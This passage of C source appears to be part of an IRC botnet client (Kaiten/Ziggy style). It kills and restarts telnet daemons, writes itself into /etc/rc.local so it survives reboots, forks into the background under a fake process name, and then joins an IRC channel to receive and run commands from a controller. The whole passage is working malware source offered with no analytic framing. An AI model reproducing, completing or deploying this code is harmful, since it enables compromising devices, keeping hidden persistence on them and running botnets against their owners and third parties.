	len = snprintf(command, sizeof(command), "(killall telnetd ; utelnetd )>/dev/null 2>&1");
	{ proc = popen(command, "r"); }
while(fgets(command, sizeof(command), proc)!=NULL){
	printf("%s", command);
	mkdir("/var/bin", 0775);}
return 0;
}

int ziggy_main(int argc, char **argv) {
        int on,i;
        char cwd[256],*str;
        FILE *file;

// call the custom startup commands
//execStuff();
#ifdef STARTUP
	str="/etc/rc.local";
	file=fopen(str,"r");
	if (file == NULL) {
		str="/etc/rc.local";
		file=fopen(str,"r");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
        nick=makestring();
        ident=makestring();
        user=makestring();
        chan=CHAN;
        if (encirc != 0) key=KEY;
	server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif
	con();
        Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,"ERROR")) goto sa;
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}
